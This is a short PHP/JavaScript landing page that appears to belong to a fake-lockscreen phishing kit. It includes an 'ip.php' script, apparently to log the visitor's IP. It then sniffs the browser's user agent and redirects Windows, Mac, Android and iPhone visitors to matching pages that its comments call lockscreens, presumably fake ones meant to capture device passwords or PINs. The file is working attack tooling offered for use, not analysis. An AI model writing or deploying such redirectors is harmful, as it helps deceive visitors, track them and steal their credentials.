<?php
include 'ip.php';
?>

<script>
var OSName = "Unknown OS";
var userAgent = navigator.userAgent || navigator.vendor || window.opera;

// More comprehensive device detection
if (userAgent.indexOf("Win") !== -1) {
    OSName = "Windows";
} else if (userAgent.indexOf("iPhone") !== -1 || userAgent.indexOf("iPad") !== -1 || userAgent.indexOf("iPod") !== -1) {
    OSName = "iPhone";
} else if (userAgent.indexOf("Android") !== -1) {
    OSName = "Android";
} else if (userAgent.indexOf("Mac") !== -1) {
    OSName = "MacOS";
} else if (userAgent.indexOf("Linux") !== -1) {
    // For Linux desktop, show Windows lockscreen (works better on desktop browsers)
    OSName = "Windows";
} else if (userAgent.indexOf("X11") !== -1 || userAgent.indexOf("UNIX") !== -1) {
    OSName = "Windows"; // Default to Windows for Unix-like systems
}

// Redirect based on detected OS
if (OSName === "Windows" || OSName === "MacOS") {
    window.location = "index2.html";
} else if (OSName === "Android") {
    window.location = "droid2.html";
} else if (OSName === "iPhone") {
    window.location = "iphone2.html";
} else {
    // Fallback to Windows lockscreen for unsupported devices
    document.write("Redirecting to lockscreen...");
    setTimeout(function() {
        window.location = "index2.html";
    }, 1000);
}
</script>
